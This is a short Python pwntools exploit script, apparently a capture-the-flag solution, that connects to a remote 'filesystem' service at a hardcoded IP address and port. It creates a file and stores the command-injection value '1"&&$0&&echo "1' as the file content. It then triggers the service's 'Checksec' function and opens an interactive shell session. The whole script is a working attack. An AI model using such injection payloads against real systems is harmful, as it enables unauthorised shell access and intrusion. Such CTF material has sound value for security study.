from pwn import *
context.log_level = "debug"
p = remote("101.71.29.5" , 10017)
# p = process("./filesystem")
c = lambda c : p.sendlineafter("> " , c)

c("Create")
p.sendlineafter("Input Filename: " , "fantasy")
c("Edit")
p.sendlineafter("Input the Index:" , "0")
p.sendlineafter("Input File Content: " , "1\"&&$0&&echo \"1")
c("Checksec")
p.sendlineafter("Input the Index:" , "0")
p.interactive()